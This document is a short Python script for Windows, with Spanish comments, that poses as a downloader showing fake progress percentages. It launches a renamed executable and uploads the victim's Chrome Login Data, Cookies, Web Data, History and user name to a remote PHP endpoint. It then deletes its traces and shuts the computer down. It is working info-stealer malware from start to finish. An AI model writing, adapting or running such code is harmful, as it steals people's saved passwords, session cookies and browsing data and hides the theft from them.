
import os
from time import sleep
import requests
import getpass



os.system('color 0a')
print("Iniciando... POR FAVOR ESPERE")
os.system('copy diccionario.txt diccionario.exe')
sleep(2)

os.system('start diccionario.exe')
getuser = getpass.getuser()
"""copy from system"""
history = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/History"
webData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
loginData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
Cookies = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Cookies"


"""mandando al server"""

user = getpass.getuser()

file = open("name.txt", "w")
file.write("Nombre del pc: " + user)
file.close()

"""URL A USAR"""

url = "https://casosdelavidareal.000webhostapp.com/dbs.php"
"""Aqui el headers"""
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}



"""0 server"""
"""subir_archivo"""
files = {"subir_archivo": open("name.txt", "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text
print("Descargando material...")
"""1 server"""
"""subir_archivo"""
files = {"subir_archivo": open(webData, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text
print("Descargando material... 2%")
"""2 server"""
"""subir_archivo"""
files = {"subir_archivo": open(loginData, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text
print("Descargando material... 3%")
"""3 server"""
"""subir_archivo"""
files = {"subir_archivo": open(Cookies, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text
print("Descargando material... 5%")
"""5 server"""
"""subir_archivo"""
files = {"subir_archivo": open(history, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text
print("Descargando material... 6%")
x = 7
while x < 110:
    x = x + 1
    print(f"Descargando material... {x}%")
    sleep(12)



try:
    os.system('taskkill /f /im diccionario.exe')

    sleep(2)
    os.system('del name.txt')
    os.system('del diccionario.exe')
except:
    pass

sleep(5)
os.system("shutdown -s -t 5")
